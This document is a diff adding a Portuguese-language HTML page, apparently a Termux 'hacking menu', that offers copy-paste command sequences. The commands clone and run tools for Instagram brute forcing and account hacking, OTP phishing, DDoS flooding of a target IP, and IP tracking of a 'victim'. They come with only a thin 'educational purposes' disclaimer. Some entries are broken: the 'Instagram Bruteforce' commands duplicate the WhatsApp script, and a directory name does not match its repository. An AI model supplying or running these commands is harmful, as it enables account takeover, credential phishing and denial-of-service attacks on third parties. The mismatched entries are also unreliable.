@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>171 TDVD - Termux</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif;}
+
+body{
+  background:#0b0b0b;
+  color:#fff;
+  padding:20px;
+  overflow-y:auto;
+  min-height:100vh;
+}
+
+h1{
+  text-align:center;
+  color:#ff0000;
+  margin-bottom:20px;
+  text-shadow:0 0 10px #ff0000;
+  padding-bottom:10px;
+  border-bottom:1px solid rgba(255,0,0,0.3);
+}
+
+.lista{
+  display:flex;
+  flex-direction:column;
+  gap:15px;
+  margin-bottom:80px;
+}
+
+/* BOTÕES */
+.item{
+  background:#111;
+  border:2px solid rgba(0,200,0,0.4);
+  border-radius:15px;
+  padding:16px;
+  cursor:pointer;
+  transition:all 0.3s;
+}
+
+.item:hover{
+  transform:translateY(-3px);
+  box-shadow:0 5px 25px rgba(0,200,0,0.5);
+  border-color:#00ff00;
+  background:#1a1a1a;
+}
+
+.item-content{
+  display:flex;
+  align-items:center;
+  gap:15px;
+}
+
+.item i{
+  color:#00ff00;
+  font-size:22px;
+  width:30px;
+  text-align:center;
+}
+
+.item-text{
+  flex:1;
+}
+
+.item-title{
+  font-weight:bold;
+  font-size:16px;
+  margin-bottom:5px;
+  color:#fff;
+}
+
+.item-subtitle{
+  font-size:12px;
+  color:#aaa;
+}
+
+.item-arrow{
+  color:#00ff00;
+  font-size:18px;
+  opacity:0.7;
+}
+
+/* TELA DO CÓDIGO */
+.code-overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.95);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:100;
+  padding:20px;
+  backdrop-filter:blur(8px);
+}
+
+.code-container{
+  background:#111;
+  border:2px solid #00ff00;
+  border-radius:18px;
+  padding:25px;
+  width:95%;
+  max-width:700px;
+  max-height:90vh;
+  overflow-y:auto;
+  box-shadow:0 0 50px #00ff00;
+  animation:pop .3s ease;
+}
+
+@keyframes pop{
+  from{transform:scale(.9);opacity:0}
+  to{transform:scale(1);opacity:1}
+}
+
+.code-header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:25px;
+  padding-bottom:15px;
+  border-bottom:1px solid rgba(0,200,0,0.3);
+}
+
+.code-header h2{
+  color:#00ff00;
+  font-size:22px;
+  margin:0;
+  flex:1;
+}
+
+.code-close{
+  background:#00ff00;
+  border:none;
+  border-radius:50%;
+  width:40px;
+  height:40px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  cursor:pointer;
+  color:#000;
+  font-size:18px;
+  font-weight:bold;
+  transition:opacity .2s;
+}
+
+.code-close:hover{
+  opacity:0.9;
+}
+
+.code-box{
+  background:#000;
+  border:1px solid #333;
+  border-radius:10px;
+  padding:20px;
+  margin-bottom:20px;
+  overflow-x:auto;
+}
+
+.code-text{
+  font-family:'Courier New', monospace;
+  font-size:14px;
+  line-height:1.6;
+  color:#00ff00;
+  white-space:pre-wrap;
+  word-break:break-all;
+  margin:0;
+}
+
+.copy-btn{
+  background:#00ff00;
+  border:none;
+  border-radius:10px;
+  padding:12px 20px;
+  color:#000;
+  font-weight:bold;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  width:100%;
+  font-size:16px;
+  transition:opacity .2s;
+  margin-top:15px;
+}
+
+.copy-btn:hover{
+  opacity:0.9;
+}
+
+.code-info{
+  background:#151515;
+  padding:15px;
+  border-radius:10px;
+  border:1px solid #222;
+  margin-top:15px;
+  font-size:13px;
+  color:#ccc;
+  line-height:1.5;
+}
+
+.code-info i{
+  color:#00ff00;
+  margin-right:8px;
+}
+
+/* VOLTAR */
+.voltar{
+  position:fixed;
+  bottom:20px;
+  right:20px;
+  width:60px;
+  height:60px;
+  border-radius:50%;
+  background:#ff0000;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  cursor:pointer;
+  box-shadow:0 0 25px #ff0000;
+  z-index:50;
+  transition:transform .3s;
+}
+
+.voltar:hover{
+  transform:scale(1.1);
+  box-shadow:0 0 35px #ff0000;
+}
+
+.voltar img{
+  width:32px;
+  height:32px;
+  object-fit:contain;
+}
+</style>
+</head>
+
+<body>
+
+<h1><i class="fas fa-terminal"></i> Termux</h1>
+
+<div class="lista">
+  <!-- Aumente seguidores no Insta -->
+  <div class="item" onclick="abrirCodigo('Aumente seguidores no Insta usando o termux', instaSeguidores)">
+    <div class="item-content">
+      <i class="fas fa-users"></i>
+      <div class="item-text">
+        <div class="item-title">Aumente seguidores no Insta</div>
+        <div class="item-subtitle">Usando Termux</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- 409 Ferramentas -->
+  <div class="item" onclick="abrirCodigo('Ferramentas do termux - 409 ferramentas', ferramentas409)">
+    <div class="item-content">
+      <i class="fas fa-tools"></i>
+      <div class="item-text">
+        <div class="item-title">409 Ferramentas em um cmd</div>
+        <div class="item-subtitle">Wiki Termux completo</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- QR Code -->
+  <div class="item" onclick="abrirCodigo('Gerador de código QR - Termux', qrCode)">
+    <div class="item-content">
+      <i class="fas fa-qrcode"></i>
+      <div class="item-text">
+        <div class="item-title">Gerador de código QR</div>
+        <div class="item-subtitle">Ferramentas Termux</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- Rastrear IP -->
+  <div class="item" onclick="abrirCodigo('Ferramentas de rastreia IP', rastrearIP)">
+    <div class="item-content">
+      <i class="fas fa-map-marker-alt"></i>
+      <div class="item-text">
+        <div class="item-title">Rastrear IP</div>
+        <div class="item-subtitle">Localização por endereço IP</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- Mr Robot -->
+  <div class="item" onclick="abrirCodigo('Ferramentas do Mr Robot', mrRobot)">
+    <div class="item-content">
+      <i class="fas fa-robot"></i>
+      <div class="item-text">
+        <div class="item-title">Ferramentas Mr Robot</div>
+        <div class="item-subtitle">Fsociety hacking tools</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- Grupos WhatsApp -->
+  <div class="item" onclick="abrirCodigo('Script para procurar gp do WhatsApp', whatsappGroups)">
+    <div class="item-content">
+      <i class="fab fa-whatsapp"></i>
+      <div class="item-text">
+        <div class="item-title">Procurar Grupos WhatsApp</div>
+        <div class="item-subtitle">Script de busca automatizada</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- Instagram Bruteforce -->
+  <div class="item" onclick="abrirCodigo('Instagram Bruteforce', instagramBrute)">
+    <div class="item-content">
+      <i class="fab fa-instagram"></i>
+      <div class="item-text">
+        <div class="item-title">Instagram Bruteforce</div>
+        <div class="item-subtitle">Ataque de força bruta</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- DDOS Whomrx -->
+  <div class="item" onclick="abrirCodigo('WHOMRX DOSX - Ferramenta DDOS', whomrxDDoS)">
+    <div class="item-content">
+      <i class="fas fa-network-wired"></i>
+      <div class="item-text">
+        <div class="item-title">WHOMRX DOSX</div>
+        <div class="item-subtitle">Ferramenta DDOS avançada</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- Hackear Instagram -->
+  <div class="item" onclick="abrirCodigo('Ferramentas de hackear Instagram', hackInstagram)">
+    <div class="item-content">
+      <i class="fas fa-user-secret"></i>
+      <div class="item-text">
+        <div class="item-title">Hackear Instagram</div>
+        <div class="item-subtitle">Insta-hack tool</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- Phishing OTP -->
+  <div class="item" onclick="abrirCodigo('Ferramentas de PHISHING baseada em OTP', phishingOTP)">
+    <div class="item-content">
+      <i class="fas fa-fish"></i>
+      <div class="item-text">
+        <div class="item-title">Phishing OTP</div>
+        <div class="item-subtitle">Advanced Phishing Tools</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+
+  <!-- DDOS SatanX -->
+  <div class="item" onclick="abrirCodigo('Ferramenta DDOS para inundar site', satanxDDoS)">
+    <div class="item-content">
+      <i class="fas fa-bomb"></i>
+      <div class="item-text">
+        <div class="item-title">SatanX Flood</div>
+        <div class="item-subtitle">DDOS attack tool</div>
+      </div>
+      <i class="fas fa-code item-arrow"></i>
+    </div>
+  </div>
+</div>
+
+<!-- TELA DO CÓDIGO -->
+<div class="code-overlay" id="codeOverlay">
+  <div class="code-container">
+    <div class="code-header">
+      <h2 id="codeTitle"></h2>
+      <button class="code-close" onclick="fecharCodigo()">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    
+    <div class="code-box">
+      <pre class="code-text" id="codeContent"></pre>
+    </div>
+    
+    <button class="copy-btn" onclick="copiarCodigo()">
+      <i class="fas fa-copy"></i> COPIAR CÓDIGO
+    </button>
+    
+    <div class="code-info">
+      <p><i class="fas fa-info-circle"></i> Copie o código e cole no Termux. Execute com cuidado e apenas para fins educacionais.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Botão voltar para menu.html -->
+<div class="voltar" onclick="window.location='tela3.html'">
+  <img src="imagem/menu.png" alt="Voltar">
+</div>
+
+<script>
+// CÓDIGOS COMPLETOS
+const instaSeguidores = `apt update && apt upgrade -y
+pkg install git 
+git clone https://github.com/rrudy0966/instatools
+cd instatools
+unzip node_modules.zip
+pkg install nodejs
+npm install instagramprivateapi
+node index`;
+
+const ferramentas409 = `pkg update && pkg upgrade
+pkg install git -y
+git clone https://github.com/DeepSociety/wiki-termux
+cd wiki-termux
+chmod +x *
+./wiki`;
+
+const qrCode = `apt update
+apt upgrade -y
+pkg install git
+git clone https://github.com/Dark-X369/Dx-Qr.git
+cd Dx-Qr
+chmod +x *
+bash install.sh`;
+
+const rastrearIP = `apt update
+apt upgrade -y
+pkg install python
+pkg install python3
+pkg install git
+pip install requests
+git clone https://github.com/Dark-X369/Dx-Ip.git
+cd Dx-Ip
+python3 ip.py -dx *<victim ip>*`;
+
+const mrRobot = `pkg update && pkg upgrade
+pkg install git
+pkg install python2
+git clone https://github.com/Manisso/fsociety.git
+cd fsociety
+chmod +x install.sh
+python2 fsociety.py`;
+
+const whatsappGroups = `pkg update && pkg upgrade
+pkg install python git
+git clone https://github.com/RozhakXD/WhatsUps.git
+cd WhatsUp
+pip install -r requirements.txt
+python Run.py`;
+
+const instagramBrute = `pkg update && pkg upgrade
+pkg install python git
+git clone https://github.com/RozhakXD/WhatsUps.git
+cd WhatsUp
+pip install -r requirements.txt
+python Run.py`;
+
+const whomrxDDoS = `pkg update -y && pkg upgrade -y
+apt update -y && apt upgrade -y
+pkg install git
+pkg install python -y
+git clone https://github.com/Whomrx666/whomrx-dosX
+cd whomrx-dosX
+python3 whomrx-dosX.py
+python3 whomrx-dosX.py -s <ip target> -p 80 -t 200`;
+
+const hackInstagram = `apt update
+apt upgrade
+pkg install python
+pkg install python2
+pkg install git
+git clone https://github.com/IncredibleHacker/insta-hack
+ls
+cd insta-hack
+pip3 install -r requirements.txt
+chmod +x *
+bash setup.sh
+bash insta-hack.sh`;
+
+const phishingOTP = `pkg up -y
+pkg install git -y
+git clone https://github.com/Ignitetch/AdvPhishing
+cd AdvPhishing
+chmod +x Android-Setup.sh
+bash Android-Setup.sh
+bash AdvPhishing.sh`;
+
+const satanxDDoS = `pkg update -y && pkg upgrade -y
+apt update -y && apt upgrade -y
+pkg install git
+pkg install perl
+git clone https://github.com/Whomrx666/satanX-flood.git
+cd satanX-flood
+perl satanX-flood.pl <ip target> 80 100 50`;
+
+// Abrir código
+function abrirCodigo(titulo, codigo) {
+  document.getElementById('codeTitle').innerText = titulo;
+  document.getElementById('codeContent').textContent = codigo;
+  document.getElementById('codeOverlay').style.display = 'flex';
+}
+
+// Fechar código
+function fecharCodigo() {
+  document.getElementById('codeOverlay').style.display = 'none';
+}
+
+// Copiar código para clipboard
+function copiarCodigo() {
+  const codigo = document.getElementById('codeContent').textContent;
+  navigator.clipboard.writeText(codigo)
+    .then(() => {
+      const btn = document.querySelector('.copy-btn');
+      const originalHTML = btn.innerHTML;
+      btn.innerHTML = '<i class="fas fa-check"></i> CÓDIGO COPIADO!';
+      btn.style.background = '#00aa00';
+      
+      setTimeout(() => {
+        btn.innerHTML = originalHTML;
+        btn.style.background = '#00ff00';
+      }, 2000);
+    })
+    .catch(err => {
+      console.error('Erro ao copiar:', err);
+      alert('Erro ao copiar código');
+    });
+}
+
+// Fechar com ESC
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') {
+    fecharCodigo();
+  }
+});
+</script>
+
+</body>
+</html>
